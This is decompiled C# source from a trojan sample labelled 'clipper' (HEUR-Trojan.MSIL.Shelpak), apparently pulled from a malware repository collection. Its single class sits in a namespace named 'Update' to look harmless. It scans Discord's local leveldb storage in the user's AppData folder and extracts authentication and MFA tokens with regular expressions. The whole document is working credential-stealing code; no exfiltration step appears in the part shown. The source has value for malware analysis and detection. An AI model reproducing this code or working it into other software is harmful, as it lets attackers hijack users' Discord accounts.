// Decompiled with JetBrains decompiler
// Type: Update.Discord
// Assembly: clipper, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 242A9602-A994-4229-B0B4-C06434ACB202
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-b5d991bf67c08940cb29c672a23da53844f43986851cbe189bb6b21c2c0e9f41.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Update
{
  internal class Discord
  {
    public static List<string> Get(string toPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\" + toPath + "\\Local Storage\\leveldb");
      List<string> source = new List<string>();
      try
      {
        foreach (FileInfo file in directoryInfo.GetFiles("*.ldb"))
        {
          string end = file.OpenText().ReadToEnd();
          foreach (Match match in Regex.Matches(end, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
            source.Add(match.Value);
          foreach (Match match in Regex.Matches(end, "mfa\\.[\\w-]{84}"))
            source.Add(match.Value);
        }
      }
      catch
      {
      }
      return source.Distinct<string>().ToList<string>();
    }
  }
}
